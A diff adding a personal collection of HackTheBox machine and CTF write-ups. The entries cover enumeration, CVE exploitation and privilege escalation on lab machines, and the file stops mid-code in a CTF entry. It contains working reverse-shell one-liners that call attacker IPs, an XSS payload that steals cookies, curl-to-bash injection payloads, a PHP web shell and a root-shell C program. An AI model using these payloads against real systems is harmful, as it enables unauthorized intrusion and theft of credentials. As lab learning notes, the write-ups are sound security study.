@@ -1,0 +1,3093 @@
+# Vulnerable Machine Writeups
+
+My writeups for any machines I solve
+
+## Author's Note:
+Obviously these are all pretty badly made, and where I have used anyone else's writeup I have made sure to include it. These are not really meant to help anyone except me so if by some miracle you stumble upon this I am sorry 😭😭. 
+
+If you do want me to put any effort into this I suppose you can drop a star on the github repo for this. Then I might at least know its not entirely private :).
+
+
+
+
+____________________________________________________________________________________________________
+# analytics-reference
+Analytics.htb writeup
+
+## Enumeration
+Using nmap we get port 22 and port 80 open
+
+## Exploitation
+Examining port 80, we can navigate to the login page, which will take us to data.analytical.htb (must be added in hosts).
+
+This is powered by metabase, which can be exploited here [Metabase Exploit](https://github.com/m3m0o/metabase-pre-auth-rce-poc). This exploit is the best one I could find as all the others require BurpSuite Collaborator, which is premium.
+
+After gaining reverse shell access, start a python http server on your machine, which will contain the **linpeas.sh** Privelege Escalation module. Use **wget *link to http server*** to download it. Run this on your target machine.
+
+We'll see 2 environment variables, which provide the username as *metalytics* and it's password. Use this to log in to SSH.
+
+## Privilege Escalation
+In the same linpeas.sh PrivEsc scan, we can get the OS version. This reveals that the OS is vulnerable to a PE attack whose PoC is registered as [CVE-2023-2640](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main).
+Of course other exploits are available so feel free to use whatever you want
+
+
+
+
+____________________________________________________________________________________________________
+# builder--rederence
+Builder.htb solved
+
+## Enumeration
+ip: 10.10.11.10
+
+On nmap scan we find port 8080 and 22 open
+
+Website Location: port 8080
+Address: http://10.10.11.10:8080/
+
+User IDs: 1. jennifer
+          2. anonymous
+
+The website runs Jenkins 2.441
+
+## Exploitation
+
+The exploit:
+https://github.com/godylockz/CVE-2024-23897
+
+allows us to read various files on the computer. Reading the files mentioned in the above repo allows for exploitation and obtaining off password hash.
+
+username: jennifer
+password_hash: #jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
+
+Encryption master key: 3e3a8909d274de18b90e8d41789423c041dae2b1132514ac43b9714d62305dfba277b5bcec3a06339d9f111e902b64d063bf2eb322eb641edb846e6c019c95cbc38b849fcc2085d5f220c5b6e5468f97d0397502c6afc5a9a1375d346cd0adf08ebc377f48124b9422e91beb5596cdecd72886d7c7e3816a8c488e0270394347
+
+Cracked the password hash by storing it in a file called crack.txt
+command:
+john crack.txt --wordlist=[path to rockyou.txt]
+Obtained password: princess
+
+Therefore,
+username: jennifer
+password: princess
+
+By reading the credentials file, we get the SSH private key
+
+We'll copy and paste this key into a file called key.id_rsa
+
+Then we use `chmod 600 key.id_rsa`
+This will allow us to connect using this key to ssh of the server
+
+Use this command `ssh -i key.id_rsa root@10.10.11.10` to the connect to the ssh server. We are able to log in as root, which means the machine is over.
+
+
+
+
+____________________________________________________________________________________________________
+I am going to try and use the regreSSHion exploit since this version of SSH seems vulnerable. (didnt work)
+
+Somehow the exploit for ClearML CVE-2024-24590 worked.
+https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit
+https://github.com/HexDoesRandomShit/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590-
+
+
+Note that we have to initialize clearml for both of these, instructions for which can be found in the second link.
+
+Found an ssh private key, which I used to connect to the server.
+
+Now for privec I used this writeup:
+https://medium.com/@68abdelrahmanmohamed/blurry-htb-write-up-b44bc2c1aea0
+
+So just check it out here.
+
+
+
+
+____________________________________________________________________________________________________
+Ports open: 22,80
+
+80 has host name cypher.htb, so fill in /etc/hosts
+
+Fuzzing helps us find a /testing endpoint containing a .jar file. Let's download it with curl and open it. I extracted it by copying it over to a .zip extension and unzipping it. Then I used ***jd-gui*** to read and decompile the .class files.
+
+This reveals a custom Procedure, which I didnt know where to call
+in the api/auth endpoint there is cypher injection, which we use this payload to get access (I used a writeup for this payload)
+
+admin' return h.value AS value  UNION CALL custom.getUrlStatusCode(\"127.0.0.1;curl http://10.10.xx.xx/shell.sh|bash\") YIELD statusCode AS value  RETURN value ; //
+
+shell.sh just contains a revshell payload, so first create shell.sh, start a http server on port 80, listener on port 4444 and then run this payload. Idk why this works so whatever tf.
+
+Once we gain a shell, we login as neo4j. We can read /home/graphasm/bbot_preset.yml for creds.
+
+`neo4j:cU4btyib.20xtCMCXkBmerhK`
+
+Let's see where this leads us. I used this password to ssh in as the graphasm user.
+
+Now we do sudo -l to find this,
+
+```
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+
+Now this is a scanner, so I combed the internet for some privesc and came across this article thru some simple google dorking,
+[article](https://www.linkedin.com/posts/neswinnigad_privilege-escalation-in-linux-via-bbot-binary-activity-7308872344649748480-O5tW)
+
+Using the exploit here, I got root flag, you can even extract the ssh key if it strikes your fancy.
+                                                                                                    
+
+
+
+
+____________________________________________________________________________________________________
+# devvortex-reference
+How I pwned devvortex
+
+found hidden dir: dev.devvortex.htb
+
+enumeration using dirsearch and seclists wordlist subdomains-top1million-20000.txt
+
+found an admin page at /administrator/
+
+Searched metasploit nothing came up
+
+But on googling found an exploit at:
+https://github.com/adhikara13/CVE-2023-23752
+
+Reveals username as lewis and password as P4ntherg0t1n5r3c0n##
+
+shell payload
+`exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.128/4444 0>&1'");`
+
+After getting the reverse shell stabilize it
+This will allow commands such as mysql to be run without hassle
+
+In the users table, the password hash was acquired which was cracked using 
+
+`john --format=bcrpyt <filename> --wordlist=/usr/share/wordlists/rockyou.txt`
+
+ssh creds:
+username: logan
+password: tequieromucho
+
+After this run `sudo -l` which shows you that the `/usr/bin/apport` can run with root.
+So, run it with the -f command and view a report.
+This opens with a vim like interface which runs shell commands as root.
+Enjoy!
+
+Moral of the story: After running `sudo -l`, explore whatever that you find there.
+
+
+
+
+____________________________________________________________________________________________________
+Port 22 and 80 open
+
+/.git/ exposed, so download with git-dumper. 
+
+On grepping for dog.htb I found this
+```
+tiffany@dog.htb
+dog@dog.htb
+```
+Now settings.php contained creds:
+```
+root:BackDropJ2024DS2024
+```
+
+Soo using these creds login to the site as admin.
+
+Go to functionality > install module > Manual install
+
+Here use this exploit to install a malicious module enabling rce
+[exploitdb](https://www.exploit-db.com/exploits/52021)
+
+This will create a .zip which is not installable, but it creates the raw folder, so zip it into tar.gz and install it.
+
+Now go to modules/shell/shell.php and start rce lol.
+
+Use this for reverse shell:
+```python
+export RHOST="10.10.14.36";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+```
++-----+-------------------+---------------------------------------------------------+
+| uid | name              | pass                                                    |
++-----+-------------------+---------------------------------------------------------+
+|   0 |                   |                                                         |
+|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. |
+|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 |
+|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD |
+|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. |
+|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS |
+|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV |
+|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT |
+|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v |
++-----+-------------------+---------------------------------------------------------+
+```
+
+This is the standard MySQL table, that I found using the older root:whateverthefuck credentials.
+By reading /etc/passwd, I simply will crack the password to jobert.
+
+So I tried this, it didnt work, instead I ended up using the johncusack account with the password I currently have
+
+Now on running sudo -l you can see that it runs `/usr/local/bin/bee`
+
+So i poked around the help menu and arrived at this for reading `root.txt`
+
+```bash
+sudo /usr/local/bin/bee --root=/var/www/html eval 'system("cat /root/root.txt");'
+```
+That's it time to skedaddle :).
+
+
+
+
+____________________________________________________________________________________________________
+# Environment - HTB
+Difficulty: Medium
+
+## Enum
+Port 22,80
+Port 80 running with debug mode on so error dms are seen
+
+```
+                        [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 280ms]
+login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 236ms]
+storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 38ms]
+upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 505ms]
+up                      [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 138ms]
+logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 550ms]
+vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 41ms]
+build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 39ms]
+mailing                 [Status: 405, Size: 244871, Words: 46159, Lines: 2576, Duration: 1399ms]
+```
+
+
+So in /login, when you fuck around with the remember param, it erros out and reveals the src. So use that to find this [exploit](https://github.com/Nyamort/CVE-2024-52301) for laravel.
+
+So just modify this in the request
+
+```
+POST /login?--env=preprod HTTP/1.1
+
+```
+
+This will bypass login.
+
+Now to upload a shell I sent a request to the upload endpoint by creating a file `shell.php.` and setting the content-type to image/jpg. I also edited the shell.php to this
+```php
+GIF89a
+<html>
+    <body>
+        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+            <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+            <input type="SUBMIT" value="Execute">
+        </form>
+    <pre>
+        <?php
+            if(isset($_GET['cmd']))
+                {
+                    system($_GET['cmd'] . ' 2>&1');
+                }
+        ?>
+    </pre>
+    </body>
+</html>
+```
+
+I got this webshell from [here](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985).
+Now the GIF89a must be the first couple of bytes so that it bypasses the magic number check. Send this with filename as `shell.php.` and content type as image/jpg. U shud be able to get a shell.
+
+I used this payload to gain a full reverse shell:
+```bash
+export RHOST="10.10.14.55";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+
+Change the IP obviously.
+
+Just navigate to the home user and get user.txt
+
+
+Now to gain a shell on user do this
+```
+cp -r /home/hish/.gnupg /tmp/mygnupg
+
+chmod -R 700 /tmp/mygnupg
+
+gpg --homedir /tmp/mygnupg --list-secret-keys
+
+gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
+```
+
+This will output these in /tmp/message.txt
+```
+PAYPAL.COM -> Ihaves0meMon$yhere123
+ENVIRONMENT.HTB -> marineSPm@ster!!
+FACEBOOK.COM -> summerSunnyB3ACH!!
+```
+
+On running `sudo -l` you get this:
+```bash
+Matching Defaults entries for root on environment:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty
+
+User root may run the following commands on environment:
+    (ALL : ALL) ALL
+```
+
+So you can change the env variables, here ENV and BASH_ENV
+
+So let's first create a file as payload called privesc.sh
+
+```bash
+#!/bin/bash
+bash -p
+```
+
+Now from here, do `chmod +x privesc.sh`
+
+Now do this:
+```bash
+sudo BASH_ENV=./privesc.sh /usr/bin/systeminfo
+```
+
+This gives a root shell
+
+
+
+
+____________________________________________________________________________________________________
+# headless-reference
+
+On intercepting the request, we see a cookie called **is_admin**. Putting it through the decoder, we find that there is the word "user" along with some random gibberish.
+
+So, let's try and get this cookie via xss.
+
+The message atrribute can be separated by a semicolon like this with the payload:<br>
+`message=random;<img src=x onerror=fetch('http://<YourIP>/?c='+document.cookie);>`
+
+Start a http server with the address as `<YourIP>` and the run this a couple of times to get the requests.
+
+The captured payload looks like this <br/>
+`GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
+
+By pasting the value of is_admin in place of the original, we get the admin dashboard.
+
+I have setup the proxy with a *match and replace* rule so that it will automatically replace the is_admin parameter with the stolen credentials.
+
+Now in the admin dashboard, when we intercept the request, we see a parameter date.<br>
+`date=2023-09-15`
+
+We can malform this by doing<br>
+`date=2023-09-15;whoami`
+
+This allows for code execution on the server.
+
+Let's spawn a reverse shell
+payload:<br>
+`date=2023-09-15;/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.21/4444+0>%261'`
+
+Possible PE vector:
+/usr/bin/python3 /home/dvir/app/inspect_reports.py
+
+Now the actual PE vector can be found by running sudo -l.
+
+This will reveal a file called `/usr/bin/syscheck`.
+
+By running cat /usr/bin/syscheck, we can see that it runs a file called initdb.sh as root.
+
+Therefore, we can do this:
+
+```bash
+echo "chmod u+s /bin/bash" > initdb.sh
+```
+
+This command will create a file called **initdb.sh** with the contents, *chmod u+s /bin/bash*.
+
+Basically what this chmod command does is that it runs the setuid bit on the /bin/bash program through syscheck. Since syscheck has root perms, we're using it to give ourselves the root shell, since the chmod command in this case, will give the bash file root perms, since root is the owner.
+
+run /usr/bin/syscheck as follows after running the above command
+```bash
+sudo /usr/bin/syscheck
+```
+
+After that run bash
+
+```bash
+/bin/bash -p
+```
+
+We're root now.
+Get the flag
+
+
+
+
+
+____________________________________________________________________________________________________
+Portscan results: port 22 and port 80 open
+
+Port 80 has hostname nocturnal.htb, so add it to /etc/hosts.
+
+Now in the view.php file, we can find that usernames are unauthenticated. So we can view and download other people's files, let's now bruteforce this.
+
+We get a user **amanda** and a **privacy.odt** file, download it. 
+
+.odt files are just zip files so we'll unzip them by changing extension to .zip and doing `unzip zipname.zip -d dest_folder` and find creds by grepping for password, using `grep -r password`, obtained this:
+
+`amanda:arHkG7HAI68X8s1J`
+
+login to the website using this and go to /admin.php
+
+So we'll create a backup, using the inbuilt functionality in /admin.php and download it, it gives us a db file as well, let's use it to get the users table
+```
+1|admin|d725aeba143f575736b07e045d8ceebb
+2|amanda|df8b20aa0c935023f99ea58358fb63c4
+4|tobias|55c82b1ccd55ab219b3b109b07d5061d
+6|asd|7815696ecbf1c96e6894b779456d330e
+```
+
+So the user tobias yields a password, so let's crack it to get:
+
+`tobias:slowmotionapocalypse`
+
+Now, doing some enum with **linpeas.sh**, we see a service running on port 8080, let's access it. This service is ISPConfig.
+
+We can login using admin:slowmotionapocalypse. Now the obvious step is to hunt for some exploits for this and I found this [exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit/blob/main/exploit.py).
+
+Using this I got root.
+
+So what did we learn? Test all parameters of a website, and to properly enumerate services for privesc.
+
+Enjoy :)
+
+
+
+
+____________________________________________________________________________________________________
+Difficulty: Easy (I'd say closer to medium)
+
+Port 22 and 80 open, so obviously just enum port 80, where you find mail.outbound.htb, so use the given creds to login.
+Roundcube mail (the service) is vulnerable to this [exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit).
+
+Also I used this script to get the shell (just copy this into a file named exploit.py in the same directory as the CVE PoC I linked).
+```python
+import os
+import requests
+
+url = "http://mail.outbound.htb/smiles.txt"
+
+command = ""
+while command != 'exit':
+    command = input("command> ")
+
+    if command == 'exit':
+        break
+    
+    if command == 'clear':
+        os.system('clear')
+        continue
+
+    shell_cmd = f"php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 \"{command} \""
+
+    os.system(shell_cmd)
+    res = requests.get(url)
+    if not len(res.text):
+        print("No response received")
+    else:
+        print(res.text)
+else:
+    print("bye")
+```
+
+Into this pseudo-shell just run `curl http://[your-server-address]/shell.php -o /var/www/html/roundcube/public_html/smiles.php` (i used my own php webshell here).
+
+To get a revshell, base64 encode the payload and then do  `echo [base64-encoded-payload] | base64 -d | bash`, which will give you a shell.
+
+Now you can read config.inc.php in the config/ file to get these creds:
+1. `roundcube:RCDBPass2025` -> These are mysql creds
+2. `$config['des_key'] = 'rcmail-!24ByteDESkey*Str';` -> we need this to decrypt the session data
+
+This is the hard part, so we have the session data (from session table in mysql), base64 decode the password (from the serialized data, it will be base64 encoded, so decode it and then read) and then turn it into hex. This gives the triple DES bytes. Now from that take the first 8 bytes as the IV value and the DES key we got as the other key input in cyberchef. Use everything after the first 8 bytes as password. This will give the email login.
+
+`jacob:595mO8DmwGeD` -> email login
+
+`jacob:gY4Wr3a1evp4` -> password, just read the email after using the login creds above.
+
+This gives ssh access and user.
+
+On running `sudo -l` we can see /usr/bin/below can be run. It is vulnerable to this exploit:
+https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py -> Use this for root access, literally just run it and do `su attacker`
+
+https://labs.hackthebox.com/achievement/machine/1785577/672
+
+
+
+
+____________________________________________________________________________________________________
+# Planning - HTB
+Difficulty: Easy
+
+## Enumeration
+Ports: 22,80
+
+### Port 80:
+    - Hostname: planning.htb
+    - Has a vhost grafana.planning.htb
+
+
+## Initial FootHold
+
+Use this [exploit](https://github.com/nollium/CVE-2024-9264) to exploit grafana, creds are provided by the machine creators.
+
+I used this command
+```bash
+python ./CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "curl http://10.10.14.16:8080/shell.sh | bash" http://grafana.planning.htb
+```
+
+Now stabilize the shell using:
+```bash
+script /dev/null -c /bin/bash
+```
+
+This will give a stable shell in a docker container as root user. We need to escape this.
+
+By checking the `/proc/1/environ` file we get this password **RioTecRANDEntANT!** and a username **enzo**
+
+Let's try to ssh in using this, which works.
+
+## Privilege Escalation
+So I used linpeas.sh and found this file /opt/crontabs/crontab.db which contained a password, which I used to login as root into the hidden service in port 8000 (just port forward it to ur machine).
+
+Then the service was running crontab-ui which I used to to run a malicious script that gave me a shell.
+
+
+
+
+____________________________________________________________________________________________________
+# surveillance-reference
+Host: surveillance.htb
+
+Found admin page at: /admin/login
+
+Uses Craft CMS (maybe vulns can be found)
+
+There appears to be some sort of CLI that I can use to interact with the server
+
+Exploit found from https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226
+
+Payload: `//bin/bash -c 'bash -i >& /dev/tcp/10.10.14.99/4444 0>&1'`
+
+by reading the etc/hosts file we find a username matthew, which is likely our ssh login name
+
+Now, by sifting through the database file, which i extracted beforehand, we find this interesting tidbit:
+```
+INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
+```
+
+So I can assume that that random set of numbers is the password of our ssh login. So let's try n crack it.
+After popping it into crackstation.net, we get that this password is: starcraft122490
+
+So let's try and log in to ssh.
+
+So by a little bit of trial and error, we arrive at the following ssh credentials:
+login: matthew@surveillance.htb
+password: starcraft122490
+
+Interesting Tidbit:
+```
+-rw-r--r-- 1 root root 0 May  2  2023 /usr/lib/node_modules/passbolt_cli/node_modules/psl/.env
+-rw-r--r-- 1 www-data www-data 836 Oct 21 18:32 /var/www/html/craft/.env
+CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
+CRAFT_ENVIRONMENT=production
+CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craftdb
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftCMSPassword2023!
+CRAFT_DB_SCHEMA=
+CRAFT_DB_TABLE_PREFIX=
+DEV_MODE=false
+ALLOW_ADMIN_CHANGES=false
+DISALLOW_ROBOTS=false
+PRIMARY_SITE_URL=http://surveillance.htb/
+```
+
+
+Maybe crafty is running with root privileges, maybe if we log in to the admin page, we can run commands as root 
+
+By using the command
+
+`mysql -u craftuser -p`
+
+and then entering the password
+We can connect to MariaDB from which there is a users table from which I use the command
+select username,email,password from users;
+
+to select the username, email and password of the users table.
+We get the following data
+username: admin
+email: admin@surveillance.htb
+password: $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
+
+This is obviously encrypted so let's decrypt it.
+For this we'll use john
+
+Now, the decrpytion will end only when I grow old and die.
+So instead, we use another interesting tidbit we find.
+
+In the hosts file, we can see that there is another service (zoneminder) which is running on port 8080.
+We are, however, unable to connect to this port.
+
+So, we will forward port 2222 on our machine to port 8080 of surveillance.htb
+Command:
+`ssh -L 2222:127.0.0.1:8080 matthew@surveillance.htb`
+
+This will allow us to access the machine through port 2222: `http://127.0.0.1:2222`
+
+Found an unauthenticated RCE exploit on:
+https://github.com/rvizx/CVE-2023-26035
+
+After stabilizing the obtained reverse shell I examined the linpeas analysis on matthew and found this interesting tidbit
+```
+-rw-r--r-- 1 root zoneminder 5265 Nov 18  2022 /usr/share/zoneminder/www/ajax/modals/storage.php
+-rw-r--r-- 1 root zoneminder 1249 Nov 18  2022 /usr/share/zoneminder/www/includes/actions/storage.php
+
+-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
+		'password' => ZM_DB_PASS,
+		'database' => ZM_DB_NAME,
+		'host' => 'localhost',
+		'password' => 'ZoneMinderPassword2023',
+		'database' => 'zm',
+				$this->default['host'] = $array[0];
+			$this->default['host'] = ZM_DB_HOST;
+-rw-r--r-- 1 root zoneminder 11257 Nov 18  2022 /usr/share/zoneminder/www/includes/database.php
+```
+
+This means that we can login to the ZoneMinder database, and mostly find the password to the zoneminder user there.
+
+I am doing this because I found that the zoneminder user can run all .pl files as sudo. So we can just do sudo su to become root.
+
+Now I didnt do most of this bit by myself, so.... well, I'll just write the steps in my own words.
+
+So, it turns out that a certain file called zmupdate.pl is actually vulnerable to some command injection, which can be found out through some sophisticated googling. Since zoneminder is running as root on the computer, it will return a root shell that we can exploit.
+So, by running this command and then stabilizing the shell, we can become root.
+``` bash
+sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
+```
+I think there are other ways to privilege escalate but I'm not sure how, I assume we can google each file and find that it's vulneable.
+
+
+
+
+____________________________________________________________________________________________________
+# wifinetictwo-reference
+
+1. After nmap, found OpenPLC running on port 8080.
+2. Login page has no real vulnerabilities, but can be logged into using default credentials openplc:openplc
+
+3. From here, we can run an authenticaated RCE attack, which this version of OpenPLC is vulnerable to.
+
+After running this attack, you log in as root which reveals the user flag. (💀)
+
+Now, to get the root flag, I don't even know wtf was going on so I just used this walkthrough 
+https://mrbandwidth.medium.com/wifinetictwo-writeup-walkthrough-htb-hackthebox-remote-code-execution-33b501b69579
+
+Thank him for his genius
+
+
+
+
+____________________________________________________________________________________________________
+https://medium.com/@emsar69/htb-resource-write-up-654ca5c04ee4
+
+
+
+
+____________________________________________________________________________________________________
+# Enumeration
+Open ports: 22,80,3000 -> found by masscan
+
+The hostname found is greenhorn, which I did by decoding the base64 cookie found during the nmap -sC -sV enumeration
+
+Port 80 runs pluck 4.7.18 which is vulnerable to authenticated RCE via unauthenticated file upload
+Port 3000 contains the repo for greenhorn where the password is found at data/settings/pass.php
+
+# Exploitation
+Use this password in this exploit https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC
+Once you are in, you can pivot to the junior user using the password **iloveyou1** (which is the password we cracked from the hash in pass.php)
+
+# Privilege Escalation
+Now there is a pdf file called 'Using OpenVas.pdf'
+Download this file and use this command
+```bash
+pdfimages -png Using\ OpenVAS.pdf out.png
+```
+to isolate the pixelated part of the image.
+
+Use this tool https://github.com/spipm/Depix to depixelate this.
+
+Now the password will be something like
+**sidefromsidetheothersidesidefromsidetheotherside**
+
+Use this to login as root via ssh, or use the su command, your wish.
+
+
+
+
+____________________________________________________________________________________________________
+# Era HackTheBox Writeup
+
+Difficulty: Medium
+
+## Enumeration
+
+First run masscan to get the open ports. I got 21,80.
+
+Port 80 had the domain name era.htb so I added it into the hosts file.
+
+There is nothing of value here so I fuzzed subdomains using 
+```bash
+ffuf -u "http://era.htb" -H "Host: FUZZ.era.htb" -fl 8 -w /usr/share/wordlists/dirb/common.txt
+```
+
+There I got the subdomain `file.era.htb`. So I registered it in hosts.
+
+Now here, there is a file upload service. On fuzzing it a little we get a `/register.php`. So I registered a user and logged in. This appears to be some sort of file upload service.
+
+There is a `download.php` endpoint which allows us to download uploaded files. But this appeared to be an IDOR since you can input any id here. So I fuzzed the IDs to get a valid id 54. This contained a backup of the site. So I downloaded it.
+
+## Initial Access
+Now from here we can download the file to analyze its contents. In it there is a database, whose users table contains this data:
+```
+admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
+eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
+veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
+yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
+john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
+ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
+```
+
+Out of these only 2 are crackable giving us credentials:
+```
+eric:america
+yuri:mustang
+```
+We also get the actual admin username.
+
+To gain admin access we don't need to go any further for now. We can go to the reset security questions page and then change the answers there. Use that to login as admin, via the `/security_login.php` endpoint.
+
+Here we can see another file signing.zip. Download that it will be useful for later.
+
+On the code review for download.php, I found that it did not validate the format parameter, which essentially allowed us to add any php stream wrapper.
+
+I used a lot of ChatGPT to arrive at this payload to login as yuri (my attempts to use this to login as eric didnt work)
+```
+http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1";
+```
+
+I url encoded this via burpsuite and sent it. Make sure to keep a tcp listener running on port 4444 while using this payload.
+
+Now we gain a shell as yuri, but not user.txt
+
+For that we need to simply login as eric. I stabilized my shell and then used the `su` command and the password we cracked for eric to login as eric. There we gain user.
+
+## Privilege Escalation
+
+So I downloaded `linpeas.sh` to the machine. And this seemed interesting: 
+```
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                             
+  Group eric:                                                                                                                                                
+/tmp/privesc                                                                                                                                                 
+/tmp/privesc/report.txt
+/tmp/privesc/linpeas.sh
+  Group devs:
+/opt/AV                                                                                                                                                      
+/opt/AV/periodic-checks
+/opt/AV/periodic-checks/monitor
+/opt/AV/periodic-checks/status.log
+```
+
+So there was a binary called monitor that was writable. Interesting 🤔.
+
+***NOTE: From here on out I had a LOT of help to figure this part out since its completely new to me***
+
+<!--I used this writeup https://lazyhackers.in/posts/era-htb-writeup-hackthebox-season-8-->
+<!--https://insidepwn.com/hackthebox-era-walkthrough-->
+
+Now I know a couple of classic ways to exploit writable binaries, but they didnt work. Instead what I found was that this binary was to be signed using specific keys which we can find in signing.zip
+
+So what we can do is this:
+
+1. Create an exploit.c file containing this:
+```c
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1", NULL);
+    return 0;
+}
+```
+2. Compile it using this: 
+```bash
+gcc -o monitor exploit.c -static
+```
+
+3. Use these commands to setup the tool to sign the malicious binary:
+```bash
+git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
+cd linux-elf-binary-signer
+make clean
+gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
+```
+
+4. Download this binary, replacing the original monitor binary on the target machine.
+
+5. Start a listener on port 1337 of your kali linux and run this binary on your target machine. It will give root shell.
+
+## Final Thoughts
+Learned lots of new things on this machine. Hope to keep cooking with the next one. Since this season had a majority of windows machines I didnt grind it as much as i should have, will cook from next season.
+
+Bye :)
+
+
+
+
+____________________________________________________________________________________________________
+# HackTheBox Ambassadors CTF Writeup
+
+## Web Challenges
+
+### Interdimensional Calculator
+
+This was a pretty easy challenge in terms of difficulty and is very beginner oriented.
+
+Initially we arrive at a homepage seemingly containing nothing. But on inspecting the HTML of the page we can find the /debug endpoint.
+
+The /debug endpoint simply contains the source code of the webserver.
+
+Source Code:
+```python
+from flask import Flask, Response, request, render_template, request
+from random import choice, randint
+from string import lowercase
+from functools import wraps
+
+app = Flask(__name__)
+
+def calc(recipe):
+	global garage
+	garage = {}
+	try: exec(recipe, garage)
+	except: pass
+
+def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
+	@wraps(func)
+	def federation(*args, **kwargs):
+		ingredient = ''.join(choice(lowercase) for _ in range(10))
+		recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))
+
